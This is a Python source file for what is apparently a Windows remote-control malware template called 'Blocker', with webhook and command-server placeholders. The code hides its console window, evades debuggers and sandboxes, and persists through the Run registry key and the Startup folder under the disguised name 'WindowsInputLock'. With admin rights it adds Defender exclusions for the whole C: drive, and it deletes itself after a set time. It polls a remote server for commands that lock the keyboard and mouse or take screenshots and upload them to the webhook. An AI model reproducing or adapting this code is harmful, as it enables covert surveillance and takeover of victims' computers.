#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os, sys, time, ctypes, subprocess, threading, shutil, winreg, tempfile, atexit, socket, platform, logging
try:
    import requests
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "-q"])
    import requests

WEBHOOK_URL = "BLOCKER_WEBHOOK_PLACEHOLDER"
COMMAND_SOURCE = "BLOCKER_COMMAND_SOURCE_PLACEHOLDER"
CHECK_INTERVAL = BLOCKER_CHECK_INTERVAL_PLACEHOLDER
STARTUP_ENABLED = BLOCKER_STARTUP_ENABLED_PLACEHOLDER
SELF_DESTRUCT_DAYS = BLOCKER_SELF_DESTRUCT_DAYS_PLACEHOLDER

logging.basicConfig(level=logging.ERROR)
try: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except: pass
try:
    if ctypes.windll.kernel32.IsDebuggerPresent(): sys.exit()
except: pass

def is_sandbox():
    try:
        import psutil
        if psutil.virtual_memory().total < 4*1024**3: return True
    except: pass
    return False
if is_sandbox(): time.sleep(600); sys.exit(0)

def add_persistence():
    if not STARTUP_ENABLED: return
    e = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsInputLock", 0, winreg.REG_SZ, f'"{e}"')
        winreg.CloseKey(key)
    except: pass
    try:
        s = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        if not getattr(sys, 'frozen', False):
            shutil.copy2(e, os.path.join(s, 'WindowsInputLock.lnk'))
        else:
            import win32com.client
            sh = win32com.client.Dispatch("WScript.Shell")
            sc = sh.CreateShortCut(os.path.join(s, 'WindowsInputLock.lnk'))
            sc.TargetPath = e; sc.WorkingDirectory = os.path.dirname(e); sc.Save()
    except: pass
    try: subprocess.run(['attrib','+h','+s',e], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except: pass

def disable_defender():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            subprocess.run('powershell -c "Add-MpPreference -ExclusionPath C:\\; Add-MpPreference -ExclusionPath %USERPROFILE%; Add-MpPreference -ExclusionPath %TEMP%"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW, capture_output=True)
    except: pass

def self_destruct():
    try:
        if os.path.exists(sys.argv[0]) and (time.time() - os.path.getctime(sys.argv[0])) > SELF_DESTRUCT_DAYS * 86400:
            b = os.path.join(os.getenv("TEMP"), "del.bat")
            with open(b, 'w') as f:
                f.write(f'@echo off\nping 127.0.0.1 -n 5 > nul\ndel /f /q "{sys.argv[0]}"\nrmdir /s /q "{os.path.dirname(sys.argv[0])}"\ndel /f /q "%~f0"')
            subprocess.Popen(b, creationflags=subprocess.CREATE_NO_WINDOW)
            sys.exit(0)
    except: pass

def send_raw(msg):
    payload = {"username": "Blocker", "avatar_url": "https://i.ibb.co/KpxXhQhm/image.png", "content": msg}
    try: requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except: pass

def get_remote_command():
    try:
        r = requests.get(COMMAND_SOURCE, timeout=5)
        if r.status_code == 200:
            cmd = r.text.strip().lower()
            if cmd.startswith("/") and len(cmd) < 50:
                return cmd
    except: pass
    return None

def process_command(cmd):
    if cmd == "/block":
        try:
            ctypes.windll.user32.BlockInput(True)
            send_raw("✅ Clavier + Souris **bloqués**")
        except: send_raw("❌ Échec du blocage")
    elif cmd == "/unblock":
        try:
            ctypes.windll.user32.BlockInput(False)
            send_raw("✅ Clavier + Souris **débloqués**")
        except: send_raw("❌ Échec du déblocage")
    elif cmd == "/screenshot":
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab()
            tmp = os.path.join(tempfile.gettempdir(), f"ss_{int(time.time())}.png")
            img.save(tmp)
            with open(tmp, 'rb') as f:
                files = {'file': (os.path.basename(tmp), f, 'image/png')}
                requests.post(WEBHOOK_URL, files=files, timeout=15)
            os.remove(tmp)
            send_raw("📸 Capture envoyée")
        except Exception as e: send_raw(f"❌ Screenshot échoué : {e}")
    elif cmd == "/status":
        s = f"Blocker actif | {socket.gethostname()} | Uptime: {int(time.time() - start_time)}s"
        send_raw(f"**Status:** {s}")
    elif cmd == "/kill":
        send_raw("💀 Arrêt du blocker...")
        sys.exit(0)
    else:
        send_raw(f"⚠️ Commande inconnue : {cmd}")

def command_loop():
    while True:
        cmd = get_remote_command()
        if cmd: process_command(cmd)
        time.sleep(CHECK_INTERVAL)

def acquire_lock():
    global lock_file
    p = os.path.join(tempfile.gettempdir(), "blocker.lock")
    try:
        if os.path.exists(p):
            with open(p, 'r') as f:
                pid = int(f.read().strip())
            try:
                os.kill(pid, 0)
                sys.exit(0)
            except: pass
        with open(p, 'w') as f:
            f.write(str(os.getpid()))
        lock_file = p
    except: pass

def release_lock():
    if lock_file and os.path.exists(lock_file):
        try: os.remove(lock_file)
        except: pass

def main():
    global start_time, lock_file
    start_time = time.time()
    acquire_lock()
    atexit.register(release_lock)
    add_persistence()
    disable_defender()
    self_destruct()
    send_raw("🔒 Blocker démarré – en attente de commandes")
    threading.Thread(target=command_loop, daemon=True).start()
    while True:
        time.sleep(60)

if __name__ == "__main__":
    try: main()
    except: sys.exit(0)